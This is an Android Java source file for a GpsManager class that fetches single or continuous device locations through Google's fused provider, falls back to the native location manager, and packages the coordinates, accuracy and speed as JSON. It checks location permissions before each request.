package com.fason.app.features.location;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Looper;

import androidx.annotation.NonNull;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.service.MainService;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;

import org.json.JSONObject;

import java.util.concurrent.atomic.AtomicBoolean;

public class GpsManager {

    private final Context ctx;
    private final FusedLocationProviderClient fused;
    private final LocationManager locMgr;
    private final AtomicBoolean tracking = new AtomicBoolean(false);

    private Location lastLocation;
    private LocationCallback callback;
    private LocationListener nativeListener;

    public GpsManager(Context context) {
        this.ctx = context.getApplicationContext();
        FusedLocationProviderClient f = null;
        try {
            f = LocationServices.getFusedLocationProviderClient(ctx);
        } catch (Exception ignored) {}
        this.fused = f;
        this.locMgr = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        init();
    }

    private void init() {
        callback = new LocationCallback() {
            @Override
            public void onLocationResult(@NonNull LocationResult result) {
                Location loc = result.getLastLocation();
                if (loc != null) lastLocation = loc;
            }
        };

        if (!hasPermission()) return;
        fetchLastLocation();
    }

    private void fetchLastLocation() {
        if (!hasPermission()) return;

        try {
            if (fused != null && (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION) ||
                checkPerm(Manifest.permission.ACCESS_COARSE_LOCATION))) {
                fused.getLastLocation()
                    .addOnSuccessListener(loc -> {
                        if (loc != null) lastLocation = loc;
                        else fallback();
                    })
                    .addOnFailureListener(e -> fallback());
            } else {
                fallback();
            }
        } catch (Exception e) {
            fallback();
        }
    }

    // Fallback to native LocationManager on non-GMS devices
    private void fallback() {
        if (locMgr == null) return;

        try {
            if (locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                Location loc = locMgr.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (loc != null) { lastLocation = loc; return; }
            }
            if (locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location loc = locMgr.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (loc != null) { lastLocation = loc; return; }
            }
        } catch (SecurityException ignored) {}
    }

    private boolean hasPermission() {
        return PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) ||
               PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION);
    }

    private boolean checkPerm(String perm) {
        return ctx.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED;
    }

    public boolean canGetLocation() {
        if (locMgr == null) return false;
        return locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
               locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    }

    public void requestSingle() {
        if (!hasPermission()) return;

        MainService svc = MainService.getInstance();
        if (svc != null) {
            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        }

        if (!requestFusedSingle()) {
            requestNativeSingle();
        }
    }

    private boolean requestFusedSingle() {
        if (fused == null) return false;
        try {
            LocationRequest req = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000)
                .setMinUpdateIntervalMillis(2000)
                .setWaitForAccurateLocation(true)
                .setMaxUpdates(1)
                .build();

            fused.requestLocationUpdates(req, callback, Looper.getMainLooper());
            return true;
        } catch (SecurityException e) {
            // Fall back to balanced accuracy if high accuracy is denied
            try {
                LocationRequest req = new LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 10000)
                    .setMinUpdateIntervalMillis(5000)
                    .setMaxUpdates(1)
                    .build();
                fused.requestLocationUpdates(req, callback, Looper.getMainLooper());
                return true;
            } catch (Exception ignored) {
                return false;
            }
        } catch (Exception e) {
            return false;
        }
    }

    private void requestNativeSingle() {
        if (locMgr == null) return;

        nativeListener = new LocationListener() {
            @Override
            public void onLocationChanged(@NonNull Location loc) {
                lastLocation = loc;
                removeNativeListener();
            }

            @Override
            public void onProviderDisabled(@NonNull String provider) {}

            @Override
            public void onProviderEnabled(@NonNull String provider) {}
        };

        try {
            if (locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locMgr.requestSingleUpdate(LocationManager.GPS_PROVIDER, nativeListener, Looper.getMainLooper());
            }
            if (locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locMgr.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, nativeListener, Looper.getMainLooper());
            }
        } catch (SecurityException ignored) {}
    }

    private void removeNativeListener() {
        if (locMgr != null && nativeListener != null) {
            try {
                locMgr.removeUpdates(nativeListener);
            } catch (Exception ignored) {}
            nativeListener = null;
        }
    }

    public void startUpdates() {
        if (tracking.getAndSet(true)) return;
        if (!hasPermission()) { tracking.set(false); return; }

        MainService svc = MainService.getInstance();
        if (svc != null) {
            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        }

        try {
            if (fused == null) { tracking.set(false); return; }
            LocationRequest req = new LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 10000)
                .setMinUpdateIntervalMillis(5000)
                .setMinUpdateDistanceMeters(10)
                .build();

            fused.requestLocationUpdates(req, callback, Looper.getMainLooper());
        } catch (Exception ignored) {}
    }

    public void stop() {
        boolean wasTracking = tracking.getAndSet(false);

        try {
            if (fused != null) fused.removeLocationUpdates(callback);
        } catch (Exception ignored) {}

        removeNativeListener();

        if (wasTracking) {
            MainService svc = MainService.getInstance();
            if (svc != null) {
                svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
            }
        }
    }

    public JSONObject getData() {
        JSONObject data = new JSONObject();
        try {
            if (lastLocation != null) {
                data.put(Protocol.KEY_ENABLED, true);
                data.put(Protocol.KEY_LATITUDE, lastLocation.getLatitude());
                data.put(Protocol.KEY_LONGITUDE, lastLocation.getLongitude());
                data.put(Protocol.KEY_ACCURACY, lastLocation.getAccuracy());
                data.put(Protocol.KEY_SPEED, lastLocation.getSpeed());
                data.put(Protocol.KEY_PROVIDER, lastLocation.getProvider());
                data.put(Protocol.KEY_TIMESTAMP, lastLocation.getTime());
            } else {
                data.put(Protocol.KEY_ENABLED, false);
                data.put(Protocol.KEY_ERROR, "No location");
            }
        } catch (Exception e) {
            try {
                data.put(Protocol.KEY_ENABLED, false);
                data.put(Protocol.KEY_ERROR, e.getMessage());
            } catch (Exception ignored) {}
        }
        return data;
    }
}
